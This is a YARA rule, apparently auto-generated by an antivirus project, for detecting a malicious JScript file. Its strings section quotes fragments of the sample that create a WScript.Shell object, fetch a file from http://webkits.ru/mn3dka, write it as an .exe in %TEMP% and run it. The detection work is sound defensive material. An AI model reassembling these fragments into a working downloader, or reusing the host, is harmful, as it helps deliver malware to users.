rule sig_20160330_0988ebff05967c4f8f240a401a864c2f {
  meta:
    description = "datamaliciousorder - file 20160330_0988ebff05967c4f8f240a401a864c2f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "c79df0b627e3535f32613aed46e5521f25e4f5e6e7cb378b1ae756b932840076"

  strings:
    $s1  = "var U = function HC() {return WScript[LM](\"WScript\"+\".Shell\");}(), W = 11;" fullword ascii
    $s2  = "function VI(A2, C0){WL = WL * 1; return A2 - C0;};" fullword ascii
    $s3  = "T1[C](\"GET\", \"http://webkits.ru/mn3dka\", false);" fullword ascii
    $s4  = "if (T1[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function T(){return HQ + \"\";};" fullword ascii
    $s6  = "function AT() {return U[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"0HJK2xoVR.ex\" + \"e\";};" fullword ascii
    $s7  = "function YF() {return ((AX == true) && (AX == L)) ? 1 : WL;};" fullword ascii
    $s8  = "function NI(A1){U[\"Run\"](A1, WL, WL);};" fullword ascii
    $s9  = "function ZW()" fullword ascii
    $s10 = "function Y(){return 22;};" fullword ascii
    $s11 = "return VI(G, X);" fullword ascii
    $s12 = "function A(){return LM;};" fullword ascii
    $s13 = "var Y0 = new this[\"Date\"]();" fullword ascii
    $s14 = "}while (Q);" fullword ascii
    $s15 = "function E(A0) {var ZR = (1, 2, 3, 4, 5, A0); return ZR;};" fullword ascii
    $s16 = "var L = false;" fullword ascii
    $s17 = "AX = true; " fullword ascii
    $s18 = "L = true; " fullword ascii
    $s19 = "var AX = false;" fullword ascii
    $s20 = "var UG = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}